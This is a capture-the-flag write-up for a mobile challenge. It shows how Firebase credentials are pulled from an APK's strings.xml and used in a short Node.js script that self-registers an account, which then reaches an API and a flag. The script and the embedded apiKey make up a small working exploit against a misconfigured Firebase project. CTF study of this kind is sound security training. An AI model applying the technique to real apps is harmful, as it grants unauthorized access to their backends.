## Mobile 3 - Broken Firebase AuthN
#### Description
Firebase services are so popular. SaaS service like this is probably secure. Prove it wrong, in the case that it is insecurely misconfigured, like in this mobile application.  
  
__Flag format__ : WTCTT2023_MOB03{[a-z0-9]{32}}  
__File__ : sh.sth.secguy888.apk 
__SHA256 Checksum__ : 450c8abb1ec0b4ffc18f4c3992007738c8439e8d8d6a6d22a3e8ebbed0d827cf

#### Solution
We still on strings.xml. if you scroll down, you will find firebase credential.
![[./assets/mobile3/1.png]]

After discovering the credential, I looked up how to use apiKey; however, in order to use it, we must develop a program. I use nodeJs to develop a program

```less
npm i firebase
```

```js
  
import { initializeApp } from "firebase/app"

import { createUserWithEmailAndPassword, getAuth,signInWithEmailAndPassword } from "firebase/auth"

  

const firebaseConfig = {

apiKey: "AIzaSyC2G3pFXGQ028mFguwmQ2lTt92MRzRoufw",

storageBucket: "wtctt2023-secguy888.appspot.com",

appId: "1:874831948305:android:5606af5d393045e378dfb0",

databaseURL: "https://wtctt2023-secguy888.firebaseio.com",

authDomain: "wtctt2023-secguy888.firebaseapp.com",

};

  

const app = initializeApp(firebaseConfig);

const auth = getAuth(app)

createUserWithEmailAndPassword(auth, "someEmail", "somePassword").then((res) => { console.log(res) })

// signInWithEmailAndPassword(auth, "test3@gmail.com", "12345678").then((res) => { console.log(res) })
```

Run code for register and you will get user for login to application, comment create function and uncomment sign function.

![[./assets/mobile3/2.png]]

but we don't know login path, Let's find it

![[./assets/mobile3/3.png]]

Finally we found this function that told you about api path and how to use it.

![[./assets/mobile3/4.png]]

Yummy, we got FLAG3. XD!!!